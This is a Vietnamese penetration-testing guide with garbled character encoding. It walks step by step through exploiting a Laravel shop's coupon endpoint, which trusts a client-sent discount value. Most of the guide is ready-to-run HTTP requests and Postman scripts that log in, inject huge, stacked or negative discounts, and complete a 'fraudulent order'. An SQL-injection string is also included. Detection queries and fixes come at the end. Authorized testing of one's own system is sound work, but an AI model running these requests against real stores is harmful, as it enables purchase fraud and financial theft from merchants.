# üö® H∆Ø·ªöNG D·∫™N HACK COUPON SYSTEM B·∫∞NG POSTMAN

## ‚ö†Ô∏è **C·∫¢NH B√ÅO**
- H∆∞·ªõng d·∫´n n√†y ch·ªâ d√†nh cho m·ª•c ƒë√≠ch PENETRATION TESTING
- Ch·ªâ s·ª≠ d·ª•ng tr√™n m√¥i tr∆∞·ªùng DEV/STAGING
- KH√îNG s·ª≠ d·ª•ng ƒë·ªÉ exploit h·ªá th·ªëng th·ª±c t·∫ø

## üéØ **VULNERABILITY OVERVIEW**

### üîç **L·ªó h·ªïng ƒë√£ ph√°t hi·ªán:**
```php
// CouponController.php - Line 15
$discount = $request->input('discount'); // ‚ö†Ô∏è TIN T∆Ø·ªûNG CLIENT!
Session::put('discount', $discount);     // ‚ö†Ô∏è L∆ØU TR·ª∞C TI·∫æP!
```

**T√°c ƒë·ªông:** User c√≥ th·ªÉ set discount value b·∫•t k·ª≥ ‚Üí Mua h√†ng v·ªõi gi√° 0ƒë ho·∫∑c √¢m!

## üõ†Ô∏è **SETUP POSTMAN ENVIRONMENT**

### Environment Variables:
```
BASE_URL: http://localhost:8000
CSRF_TOKEN: (auto-extracted)
SESSION_COOKIE: (auto-extracted)
USER_EMAIL: customer@example.com
USER_PASSWORD: password123
```

## üöÄ **STEP-BY-STEP EXPLOIT GUIDE**

### **PHASE 1: AUTHENTICATION & SETUP**

#### **Step 1.1: L·∫•y CSRF Token**
```http
GET {{BASE_URL}}/login
```

**Postman Test Script:**
```javascript
pm.test("Extract CSRF Token", function () {
    const html = pm.response.text();
    const csrfMatch = html.match(/name="csrf-token" content="([^"]+)"/);
    if (csrfMatch) {
        pm.environment.set("CSRF_TOKEN", csrfMatch[1]);
        console.log("‚úÖ CSRF Token extracted:", csrfMatch[1]);
    } else {
        console.log("‚ùå CSRF Token not found!");
    }
});
```

#### **Step 1.2: Login ƒë·ªÉ l·∫•y authenticated session**
```http
POST {{BASE_URL}}/login
Content-Type: application/x-www-form-urlencoded

email={{USER_EMAIL}}&
password={{USER_PASSWORD}}&
_token={{CSRF_TOKEN}}
```

**Test Script:**
```javascript
pm.test("Login successful", function () {
    pm.expect(pm.response.code).to.be.oneOf([200, 302]);
    
    // Extract session cookie
    const cookies = pm.response.headers.get("Set-Cookie");
    if (cookies) {
        const sessionMatch = cookies.match(/laravel_session=([^;]+)/);
        if (sessionMatch) {
            pm.environment.set("SESSION_COOKIE", sessionMatch[1]);
            console.log("‚úÖ Session cookie extracted");
        }
    }
    
    // Check for redirect to homepage (successful login)
    if (pm.response.code === 302) {
        const location = pm.response.headers.get("Location");
        if (location.includes("/") || location.includes("home")) {
            console.log("‚úÖ Login successful - redirected to:", location);
        }
    }
});
```

#### **Step 1.3: Th√™m s·∫£n ph·∫©m v√†o gi·ªè h√†ng**
```http
POST {{BASE_URL}}/cart/add
Content-Type: application/json
X-CSRF-TOKEN: {{CSRF_TOKEN}}
Cookie: laravel_session={{SESSION_COOKIE}}

{
    "variant_id": 1,
    "quantity": 2,
    "toppings": []
}
```

**Test Script:**
```javascript
pm.test("Product added to cart", function () {
    const jsonData = pm.response.json();
    pm.expect(jsonData.success).to.be.true;
    console.log("‚úÖ Product added to cart");
});
```

### **PHASE 2: COUPON EXPLOITATION**

#### **Step 2.1: üö® CRITICAL EXPLOIT - Apply Malicious Discount**
```http
POST {{BASE_URL}}/coupon/apply
Content-Type: application/json
X-CSRF-TOKEN: {{CSRF_TOKEN}}
Cookie: laravel_session={{SESSION_COOKIE}}

{
    "coupon_code": "FASTFOOD10",
    "discount": 999999999
}
```

**Test Script:**
```javascript
pm.test("üö® COUPON VULNERABILITY EXPLOIT", function () {
    const jsonData = pm.response.json();
    
    console.log("=".repeat(50));
    console.log("üö® TESTING COUPON VULNERABILITY");
    console.log("=".repeat(50));
    
    if (jsonData.success === true) {
        console.log("‚úÖ Server accepted coupon request");
        
        if (jsonData.discount && jsonData.discount >= 999999999) {
            console.log("üö® CRITICAL VULNERABILITY CONFIRMED!");
            console.log("üí∞ Malicious discount accepted:", jsonData.discount.toLocaleString('vi-VN'), "ƒë");
            console.log("üî• FINANCIAL IMPACT: EXTREME");
            
            // Set environment flag
            pm.environment.set("VULNERABILITY_EXPLOITED", "true");
            pm.environment.set("MALICIOUS_DISCOUNT", jsonData.discount);
            
        } else {
            console.log("‚ö†Ô∏è Server accepted coupon but limited discount amount");
        }
    } else {
        console.log("‚úÖ Server rejected malicious coupon (GOOD)");
        console.log("Response:", jsonData);
    }
});
```

#### **Step 2.2: Verify Exploit Success - Check Cart**
```http
GET {{BASE_URL}}/cart
Cookie: laravel_session={{SESSION_COOKIE}}
```

**Test Script:**
```javascript
pm.test("Verify malicious discount in cart", function () {
    const html = pm.response.text();
    
    // Look for discount amount in HTML
    if (html.includes('999,999,999') || html.includes('999999999')) {
        console.log("üëÅÔ∏è MALICIOUS DISCOUNT VISIBLE IN CART!");
        pm.environment.set("DISCOUNT_VISIBLE_CART", "true");
    }
    
    // Look for total amount
    const totalMatch = html.match(/T·ªïng c·ªông.*?(\d{1,3}(?:\.\d{3})*|\d+)/);
    if (totalMatch) {
        const total = parseInt(totalMatch[1].replace(/\./g, ''));
        console.log("üíµ Current cart total:", total.toLocaleString('vi-VN'), "ƒë");
        
        if (total <= 0) {
            console.log("üö® CART TOTAL IS ZERO OR NEGATIVE!");
            pm.environment.set("NEGATIVE_TOTAL", "true");
        }
    }
});
```

#### **Step 2.3: Advanced Exploit - Multiple Discount Stacking**
```http
POST {{BASE_URL}}/coupon/apply
Content-Type: application/json
X-CSRF-TOKEN: {{CSRF_TOKEN}}
Cookie: laravel_session={{SESSION_COOKIE}}

{
    "coupon_code": "FASTFOOD10",
    "discount": 500000000
}
```

**Test Script:**
```javascript
pm.test("Test discount stacking vulnerability", function () {
    const jsonData = pm.response.json();
    const previousDiscount = parseInt(pm.environment.get("MALICIOUS_DISCOUNT") || "0");
    
    if (jsonData.success && jsonData.discount) {
        if (jsonData.discount === (previousDiscount + 500000000)) {
            console.log("üö® DISCOUNT STACKING VULNERABILITY!");
            console.log("üí∞ Total accumulated discount:", jsonData.discount.toLocaleString('vi-VN'), "ƒë");
        } else {
            console.log("‚ÑπÔ∏è Discount gets overwritten (normal behavior)");
        }
    }
});
```

### **PHASE 3: CHECKOUT EXPLOITATION**

#### **Step 3.1: Verify Discount in Checkout**
```http
GET {{BASE_URL}}/checkout
Cookie: laravel_session={{SESSION_COOKIE}}
```

**Test Script:**
```javascript
pm.test("Verify malicious discount in checkout", function () {
    const html = pm.response.text();
    
    console.log("=".repeat(40));
    console.log("üõí CHECKOUT VERIFICATION");
    console.log("=".repeat(40));
    
    // Check for malicious discount
    if (html.includes('999,999,999') || html.includes('999999999')) {
        console.log("üëÅÔ∏è MALICIOUS DISCOUNT VISIBLE IN CHECKOUT!");
        pm.environment.set("EXPLOIT_VISIBLE_CHECKOUT", "true");
    }
    
    // Check final total
    const totalMatch = html.match(/T·ªïng c·ªông.*?(\d{1,3}(?:\.\d{3})*|\d+)/);
    if (totalMatch) {
        const total = parseInt(totalMatch[1].replace(/\./g, ''));
        console.log("üíµ Checkout total:", total.toLocaleString('vi-VN'), "ƒë");
        
        if (total <= 0) {
            console.log("üö® CHECKOUT TOTAL IS ZERO OR NEGATIVE!");
            console.log("üíé READY FOR FREE/PROFITABLE ORDER!");
        }
    }
    
    // Check shipping fee inconsistency
    if (html.includes('$subtotal > 100000') && html.includes('15000')) {
        console.log("‚ö†Ô∏è Frontend shipping logic: Free > 100k, Fee: 15k");
        pm.environment.set("FRONTEND_SHIPPING", "100000");
    }
});
```

#### **Step 3.2: üö® COMPLETE FRAUDULENT ORDER**
```http
POST {{BASE_URL}}/checkout/process
Content-Type: application/x-www-form-urlencoded
X-CSRF-TOKEN: {{CSRF_TOKEN}}
Cookie: laravel_session={{SESSION_COOKIE}}

full_name=Security Tester&
phone=0123456789&
email=exploit@test.com&
address=123 Exploit Street&
city=H√† N·ªôi&
district=Ba ƒê√¨nh&
ward=Ph√∫c X√°&
payment_method=cod&
terms=on&
notes=Security test - DO NOT DELIVER
```

**Test Script:**
```javascript
pm.test("üö® FRAUDULENT ORDER COMPLETION", function () {
    console.log("=".repeat(50));
    console.log("üö® ATTEMPTING FRAUDULENT ORDER");
    console.log("=".repeat(50));
    
    if (pm.response.code === 302) {
        const location = pm.response.headers.get('Location');
        
        if (location && location.includes('success')) {
            console.log("üö® CRITICAL: FRAUDULENT ORDER COMPLETED SUCCESSFULLY!");
            console.log("üéØ Success page:", location);
            
            // Extract order number if possible
            const orderMatch = location.match(/order_number=([^&]+)/);
            if (orderMatch) {
                console.log("üìã Order number:", orderMatch[1]);
                pm.environment.set("FRAUDULENT_ORDER_ID", orderMatch[1]);
            }
            
            pm.environment.set("EXPLOIT_COMPLETED", "true");
            
        } else if (location && location.includes('error')) {
            console.log("‚ùå Order failed - redirected to error page");
        }
    } else if (pm.response.code === 200) {
        const html = pm.response.text();
        if (html.includes('error') || html.includes('failed')) {
            console.log("‚ùå Order processing failed");
        }
    }
});
```

## üìä **EXPLOIT VERIFICATION & REPORTING**

### **Final Verification Request**
```http
GET {{BASE_URL}}/checkout/success?order_number={{FRAUDULENT_ORDER_ID}}
Cookie: laravel_session={{SESSION_COOKIE}}
```

**Test Script:**
```javascript
pm.test("Final exploit verification", function () {
    const vulnerabilityExploited = pm.environment.get("VULNERABILITY_EXPLOITED");
    const exploitCompleted = pm.environment.get("EXPLOIT_COMPLETED");
    
    console.log("\n" + "=".repeat(60));
    console.log("üìä FINAL SECURITY ASSESSMENT REPORT");
    console.log("=".repeat(60));
    
    if (vulnerabilityExploited === "true") {
        console.log("üö® CRITICAL VULNERABILITY CONFIRMED");
        console.log("üí∞ Financial Impact: EXTREME");
        console.log("üéØ Attack Vector: Discount Manipulation");
        
        if (exploitCompleted === "true") {
            console.log("üí• FULL EXPLOIT CHAIN SUCCESSFUL");
            console.log("üìã Fraudulent order created with malicious discount");
        }
    } else {
        console.log("‚úÖ Vulnerability not exploitable (GOOD)");
    }
    
    console.log("\nüõ°Ô∏è IMMEDIATE ACTIONS REQUIRED:");
    console.log("1. Implement server-side discount validation");
    console.log("2. Remove client-controlled discount values");
    console.log("3. Add audit logging for all coupon applications");
    console.log("4. Implement rate limiting");
    
    console.log("\n‚ö†Ô∏è EVIDENCE COLLECTED:");
    console.log("- CSRF Token:", pm.environment.get("CSRF_TOKEN"));
    console.log("- Malicious Discount:", pm.environment.get("MALICIOUS_DISCOUNT"));
    console.log("- Order ID:", pm.environment.get("FRAUDULENT_ORDER_ID"));
});
```

## üéØ **ADVANCED EXPLOITATION TECHNIQUES**

### **Technique 1: Negative Discount (Profit)**
```http
POST {{BASE_URL}}/coupon/apply
Content-Type: application/json

{
    "coupon_code": "FASTFOOD10",
    "discount": -1000000
}
```

### **Technique 2: Decimal Precision Attack**
```http
POST {{BASE_URL}}/coupon/apply
Content-Type: application/json

{
    "coupon_code": "FASTFOOD10",
    "discount": 999999999.99
}
```

### **Technique 3: String Injection**
```http
POST {{BASE_URL}}/coupon/apply
Content-Type: application/json

{
    "coupon_code": "FASTFOOD10",
    "discount": "999999999; DROP TABLE orders; --"
}
```

## üîç **MONITORING & DETECTION**

### **Database Queries to Check Exploit Success:**
```sql
-- Check for suspicious orders
SELECT order_number, subtotal, discount_amount, total_amount, created_at
FROM orders 
WHERE discount_amount > 100000 
   OR total_amount <= 0
ORDER BY created_at DESC;

-- Check for unusual discount patterns
SELECT COUNT(*) as suspicious_orders, 
       AVG(discount_amount) as avg_discount
FROM orders 
WHERE discount_amount > 500000;
```

### **Log Analysis:**
```bash
# Check Laravel logs for coupon activities
tail -f storage/logs/laravel.log | grep -i "coupon\|discount"

# Monitor for high-value discounts
grep "999999999" storage/logs/laravel.log
```

## üõ°Ô∏è **DEFENSIVE MEASURES**

### **Immediate Fixes Needed:**
1. **Server-side discount validation**
2. **Remove client-controlled discount values**
3. **Implement proper coupon validation logic**
4. **Add rate limiting for coupon applications**
5. **Audit logging for all financial operations**

### **Long-term Security Improvements:**
1. **Input sanitization and validation**
2. **Business logic testing**
3. **Regular security audits**
4. **Penetration testing**

---

## ‚ö†Ô∏è **LEGAL DISCLAIMER**

**H∆∞·ªõng d·∫´n n√†y ch·ªâ d√†nh cho:**
- ‚úÖ Security researchers v√† penetration testers
- ‚úÖ Development teams testing their own systems
- ‚úÖ Educational purposes trong m√¥i tr∆∞·ªùng controlled

**KH√îNG ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ:**
- ‚ùå Exploit systems kh√¥ng ƒë∆∞·ª£c ph√©p
- ‚ùå G√¢y thi·ªát h·∫°i t√†i ch√≠nh
- ‚ùå Vi ph·∫°m lu·∫≠t ph√°p

**USE AT YOUR OWN RISK!** 